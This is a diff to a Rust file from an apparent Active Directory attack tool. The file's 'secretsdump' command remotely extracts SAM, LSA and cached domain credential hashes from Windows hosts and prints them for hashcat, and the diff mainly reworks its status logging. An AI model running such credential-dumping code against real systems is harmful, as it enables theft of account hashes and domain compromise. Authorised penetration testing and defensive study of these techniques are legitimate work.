@@ -7,6 +7,7 @@
 //! downloads. Slow path: `reg save HKLM\{SAM,SECURITY,SYSTEM}` as LocalSystem
 //! + C\$ pull. Both end at the same offline decrypt.
 
+use crate::ui;
 use anyhow::{Context, Result};
 use clap::Parser;
 
@@ -57,9 +58,9 @@ pub(crate) async fn secretsdump(mut a: SecretsdumpArgs) -> Result<()> {
         {
             Ok(r) => Some(r),
             Err(e) => {
-                eprintln!(
-                    "[!] Remote Registry unreachable ({e}) — falling back to `reg save` hives"
-                );
+                ui::warn(&format!(
+                    "Remote Registry unreachable ({e}) — falling back to `reg save` hives"
+                ));
                 None
             }
         };
@@ -72,28 +73,28 @@ pub(crate) async fn secretsdump(mut a: SecretsdumpArgs) -> Result<()> {
                         let bk_res = adhammer_secrets::bootkey_via_rrp_hklm(r, &hklm).await;
                         let bk_opt = match bk_res {
                             Ok(bk) => {
-                                eprintln!(
-                                    "[+] bootkey via RRP: {}",
+                                ui::ok(&format!(
+                                    "bootkey via RRP: {}",
                                     bk.iter().map(|b| format!("{b:02x}")).collect::<String>()
-                                );
+                                ));
                                 if let Ok(users) =
                                     adhammer_secrets::dump_sam_via_rrp_hklm(r, &hklm, &bk).await
                                 {
-                                    eprintln!("[+] SAM via RRP: {} account(s)", users.len());
+                                    ui::ok(&format!("SAM via RRP: {} account(s)", users.len()));
                                     rrp_sam = Some(users);
                                 }
                                 if let Ok(secrets) =
                                     adhammer_secrets::dump_lsa_via_rrp_hklm(r, &hklm, &bk).await
                                 {
-                                    eprintln!("[+] LSA via RRP: {} secret(s)", secrets.len());
+                                    ui::ok(&format!("LSA via RRP: {} secret(s)", secrets.len()));
                                     rrp_lsa = Some(secrets);
                                 }
                                 Some(bk)
                             }
                             Err(e) => {
-                                eprintln!(
-                                    "[!] RRP bootkey failed ({e}) — falling back to `reg save` hives"
-                                );
+                                ui::warn(&format!(
+                                    "RRP bootkey failed ({e}) — falling back to `reg save` hives"
+                                ));
                                 None
                             }
                         };
@@ -101,9 +102,9 @@ pub(crate) async fn secretsdump(mut a: SecretsdumpArgs) -> Result<()> {
                         bk_opt
                     }
                     Err(e) => {
-                        eprintln!(
-                            "[!] RRP OpenHKLM failed ({e}) — falling back to `reg save` hives"
-                        );
+                        ui::warn(&format!(
+                            "RRP OpenHKLM failed ({e}) — falling back to `reg save` hives"
+                        ));
                         None
                     }
                 }
@@ -165,8 +166,8 @@ pub(crate) async fn secretsdump(mut a: SecretsdumpArgs) -> Result<()> {
         };
         (sys, sa, se)
     };
-    eprintln!(
-        "[+] hives: SYSTEM {}, SAM {}, SECURITY {}",
+    ui::ok(&format!(
+        "hives: SYSTEM {}, SAM {}, SECURITY {}",
         system
             .as_ref()
             .map_or("skipped (RRP)".into(), |v| format!("{} B", v.len())),
@@ -175,11 +176,11 @@ pub(crate) async fn secretsdump(mut a: SecretsdumpArgs) -> Result<()> {
         security
             .as_ref()
             .map_or("unavailable".into(), |v| format!("{} B", v.len())),
-    );
+    ));
     if sam.is_none() || security.is_none() {
-        eprintln!(
-            "[!] a protected hive was denied by the target (SeBackupPrivilege / hardening). \
-             On a DC, use `attack dcsync` for domain secrets — SAM/LSA here cover only local creds."
+        ui::warn(
+            "a protected hive was denied by the target (SeBackupPrivilege / hardening). \
+             On a DC, use `attack dcsync` for domain secrets — SAM/LSA here cover only local creds.",
         );
     }
 
@@ -189,29 +190,31 @@ pub(crate) async fn secretsdump(mut a: SecretsdumpArgs) -> Result<()> {
     } else {
         match (sam.as_ref(), bootkey_rrp.as_ref(), system.as_ref()) {
             (Some(s), Some(bk), _) => adhammer_secrets::local_dump_with_bootkey(s, bk)
-                .map_err(|e| eprintln!("[-] SAM decrypt failed: {e}"))
+                .map_err(|e| ui::bad(&format!("SAM decrypt failed: {e}")))
                 .ok(),
             (Some(s), None, Some(sys)) => adhammer_secrets::local_dump(sys, s)
-                .map_err(|e| eprintln!("[-] SAM decrypt failed: {e}"))
+                .map_err(|e| ui::bad(&format!("SAM decrypt failed: {e}")))
                 .ok(),
             _ => None,
         }
     };
     match sam_accounts {
         Some(accounts) => {
-            eprintln!("[+] {} local account(s):", accounts.len());
+            ui::ok(&format!("{} local account(s):", accounts.len()));
             for acct in accounts {
+                // Data on stdout — hashcat and other downstream cracking consumers pipe
+                // this. Do not move to stderr.
                 println!("{}", acct.secretsdump_line());
             }
         }
-        None => eprintln!("[*] SAM hive unavailable — skipping local accounts"),
+        None => ui::info("SAM hive unavailable — skipping local accounts"),
     }
 
     // --- LSA secrets + cached domain credentials (DCC2) ---
     // RRP path returns secrets only (DCC2 needs BaseRegEnumValue — follow-up); hive path
     // returns both.
     if let Some(secrets) = rrp_lsa {
-        eprintln!("[+] {} LSA secret(s):", secrets.len());
+        ui::ok(&format!("{} LSA secret(s):", secrets.len()));
         for s in &secrets {
             if s.name.eq_ignore_ascii_case("$MACHINE.ACC") {
                 let nt: String = ntlmssp::md4(&s.secret)
@@ -223,13 +226,13 @@ pub(crate) async fn secretsdump(mut a: SecretsdumpArgs) -> Result<()> {
                 print_lsa_secret(&s.name, &s.secret);
             }
         }
-        eprintln!(
-            "[*] DCC2 cache via RRP not yet implemented — falling back requires the SECURITY hive."
+        ui::info(
+            "DCC2 cache via RRP not yet implemented — falling back requires the SECURITY hive.",
         );
         return Ok(());
     }
     let Some(security) = security.as_ref() else {
-        eprintln!("[*] SECURITY hive unavailable — skipping LSA secrets / DCC2");
+        ui::info("SECURITY hive unavailable — skipping LSA secrets / DCC2");
         return Ok(());
     };
     let lsa_result = match (bootkey_rrp.as_ref(), system.as_ref()) {
@@ -239,7 +242,7 @@ pub(crate) async fn secretsdump(mut a: SecretsdumpArgs) -> Result<()> {
     };
     match lsa_result {
         Ok(dump) => {
-            eprintln!("[+] {} LSA secret(s):", dump.secrets.len());
+            ui::ok(&format!("{} LSA secret(s):", dump.secrets.len()));
             for s in &dump.secrets {
                 if s.name.eq_ignore_ascii_case("$MACHINE.ACC") {
                     let nt: String = ntlmssp::md4(&s.secret)
@@ -252,16 +255,16 @@ pub(crate) async fn secretsdump(mut a: SecretsdumpArgs) -> Result<()> {
                 }
             }
             if !dump.cached.is_empty() {
-                eprintln!(
-                    "[+] {} cached domain logon(s) (hashcat -m 2100):",
+                ui::ok(&format!(
+                    "{} cached domain logon(s) (hashcat -m 2100):",
                     dump.cached.len()
-                );
+                ));
                 for c in &dump.cached {
                     println!("{}", c.dcc2_line());
                 }
             }
         }
-        Err(e) => eprintln!("[-] LSA decrypt failed: {e}"),
+        Err(e) => ui::bad(&format!("LSA decrypt failed: {e}")),
     }
     Ok(())
 }
